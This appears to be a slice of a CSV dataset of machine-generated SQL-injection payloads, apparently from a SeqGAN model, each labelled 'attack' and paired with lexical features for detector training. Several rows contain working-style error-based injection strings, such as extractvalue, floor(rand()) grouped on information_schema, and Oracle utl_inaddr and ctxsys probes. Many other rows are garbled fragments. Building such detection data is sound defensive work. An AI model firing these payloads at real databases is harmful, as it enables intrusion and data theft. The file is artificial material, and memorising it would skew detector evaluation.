label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'tur",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299,182.0,26.0,3.3716605078806934,42.0,35.0,81.0,24.0,0.23076923076923078,0.19230769230769232,0.44505494505494503,0.13186813186813187,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-9891(  )     ||  fromhr   6237m   (  )0x717a767a71,mYdlv'  =  'hdunzz_'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300,78.0,31.0,4.091607927156838,21.0,17.0,25.0,15.0,0.2692307692307692,0.21794871794871795,0.32051282051282054,0.19230769230769232,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,1.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""5A",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301,4.0,4.0,2.0,1.0,2.0,0.0,1.0,0.25,0.5,0.0,0.25,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-kcSetlisdbq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302,12.0,12.0,3.584962500721156,11.0,0.0,0.0,1.0,0.9166666666666666,0.0,0.0,0.08333333333333333,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1G9891pVas,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303,10.0,8.0,2.9219280948873623,5.0,5.0,0.0,0.0,0.5,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%Y6236122    ||3074w,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304,21.0,12.0,3.403989446485262,2.0,12.0,4.0,3.0,0.09523809523809523,0.5714285714285714,0.19047619047619047,0.14285714285714285,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1jIzx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305,5.0,5.0,2.321928094887362,4.0,1.0,0.0,0.0,0.8,0.2,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%C_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306,4.0,4.0,2.0,1.0,1.0,0.0,2.0,0.25,0.25,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%concat||.schsxwuatz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307,21.0,15.0,3.7849418274376427,16.0,1.0,0.0,4.0,0.7619047619047619,0.047619047619047616,0.0,0.19047619047619047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1NyuBs5584' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'GS7158   and  =  )    )    2    1 concat  select)   )   )    ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308,364.0,45.0,4.046111233979552,126.0,62.0,135.0,41.0,0.34615384615384615,0.17032967032967034,0.3708791208791209,0.11263736263736264,2.0,0.0,0.0,0.0,2.0,3.0,0.0,24.0,0.0,2.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310,1.0,1.0,-0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%4510%hhaynllnbnu""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""3051    0)  asxdolt_nlwYdelt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311,256.0,39.0,3.6961004557058894,73.0,41.0,109.0,33.0,0.28515625,0.16015625,0.42578125,0.12890625,0.0,2.0,0.0,0.0,1.0,1.0,0.0,21.0,2.0,1.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1""  =  ""ay",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312,10.0,6.0,2.321928094887362,2.0,1.0,4.0,3.0,0.2,0.1,0.4,0.3,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%<0x5c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313,7.0,7.0,2.8073549220576037,2.0,3.0,0.0,2.0,0.2857142857142857,0.42857142857142855,0.0,0.2857142857142857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""#xveyn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314,341.0,36.0,3.5944300075061824,89.0,49.0,144.0,59.0,0.26099706744868034,0.1436950146627566,0.4222873900293255,0.17302052785923755,0.0,2.0,0.0,0.0,0.0,2.0,0.0,30.0,1.0,0.0,1.0,22.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""nunu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315,6.0,4.0,1.9182958340544896,4.0,1.0,0.0,1.0,0.6666666666666666,0.16666666666666666,0.0,0.16666666666666666,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1}  )    #vT0x717a767a71i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316,25.0,13.0,3.288884070537636,6.0,10.0,6.0,3.0,0.24,0.4,0.24,0.12,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1xr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317,3.0,3.0,1.584962500721156,2.0,1.0,0.0,0.0,0.6666666666666666,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1% ' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'osfyrIkithenaununat~",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318,281.0,39.0,4.128982214155232,119.0,35.0,94.0,33.0,0.4234875444839858,0.12455516014234876,0.33451957295373663,0.11743772241992882,2.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,1.0,2.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,-%78641ydui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319,11.0,11.0,3.4594316186372973,4.0,5.0,0.0,2.0,0.36363636363636365,0.45454545454545453,0.0,0.18181818181818182,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select 'sxvell,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320,23.0,12.0,3.344456935241198,12.0,1.0,5.0,5.0,0.5217391304347826,0.043478260869565216,0.21739130434782608,0.21739130434782608,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"<""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   """"  =  ""       x  (  )    by end  )       )    0x78   x  caseelabysn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321,237.0,30.0,3.3956901443923457,59.0,37.0,111.0,30.0,0.2489451476793249,0.15611814345991562,0.46835443037974683,0.12658227848101267,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '  ,  c  chdri",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322,341.0,33.0,3.591683253465692,98.0,44.0,142.0,57.0,0.2873900293255132,0.12903225806451613,0.41642228739002934,0.16715542521994134,2.0,0.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,1.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323,17.0,10.0,3.0516016368717036,6.0,1.0,5.0,5.0,0.35294117647058826,0.058823529411764705,0.29411764705882354,0.29411764705882354,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'||  (  select 'yOus'  =  'b'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324,36.0,15.0,3.1806057975489472,11.0,1.0,13.0,11.0,0.3055555555555556,0.027777777777777776,0.3611111111111111,0.3055555555555556,6.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'||  (  select 'xzu_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325,21.0,14.0,3.5537631144722455,9.0,1.0,5.0,6.0,0.42857142857142855,0.047619047619047616,0.23809523809523808,0.2857142857142857,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select '  )   thenxNMxem,0  )o",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326,39.0,20.0,3.720798372486508,17.0,2.0,12.0,8.0,0.4358974358974359,0.05128205128205128,0.3076923076923077,0.20512820512820512,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-""  =  ""ap",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327,10.0,6.0,2.321928094887362,2.0,0.0,4.0,4.0,0.2,0.0,0.4,0.4,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-U3051--_ds0x7171706a71dzlw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328,27.0,16.0,3.736006946447656,9.0,14.0,0.0,4.0,0.3333333333333333,0.5185185185185185,0.0,0.14814814814814814,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1z0x717a767a71"" like "".N",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329,24.0,15.0,3.653107168362811,9.0,10.0,2.0,3.0,0.375,0.4166666666666667,0.08333333333333333,0.125,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-6825a  (  ||chui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330,17.0,13.0,3.4992275471326924,5.0,4.0,4.0,4.0,0.29411764705882354,0.23529411764705882,0.23529411764705882,0.23529411764705882,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack," to.sieitb_atlj'  =  'u"" like ""T",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331,32.0,18.0,3.838710641914682,18.0,0.0,7.0,7.0,0.5625,0.0,0.21875,0.21875,2.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1oze,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332,4.0,4.0,2.0,3.0,1.0,0.0,0.0,0.75,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-0x786913tvff5840N,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333,18.0,15.0,3.8365916681089787,6.0,11.0,0.0,1.0,0.3333333333333333,0.6111111111111112,0.0,0.05555555555555555,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334,10.0,8.0,2.9219280948873623,4.0,1.0,2.0,3.0,0.4,0.1,0.2,0.3,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
